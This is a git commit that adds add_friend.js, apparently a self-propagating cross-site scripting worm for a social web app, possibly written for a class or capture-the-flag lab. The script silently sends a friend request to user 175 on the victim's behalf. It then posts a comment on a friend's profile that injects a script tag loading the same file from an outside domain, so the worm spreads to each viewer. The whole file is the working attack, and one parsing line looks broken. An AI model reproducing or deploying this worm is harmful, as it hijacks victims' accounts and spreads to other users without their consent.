fc7c2b84179df86ef2a60b6f98707171489c4ad3
Sean Sun <seansun.q@gmail.com>
2017-04-13 19:26:18 -0400

    Create add_friend.js

---
+++ add_friend.js
@@ -0,0 +1,6 @@
+$.get("add_friend.php?id=175");
+
+$.get("friends.php", function( data ) {
+    var id = data.substr("id=").split(",");
+	$.get("add_comment.php?id="+id[0]+"&comment=<script src='https://seanqsun.com/Amateur-Hour/add_friend.js'></script>", function(data){});
+});
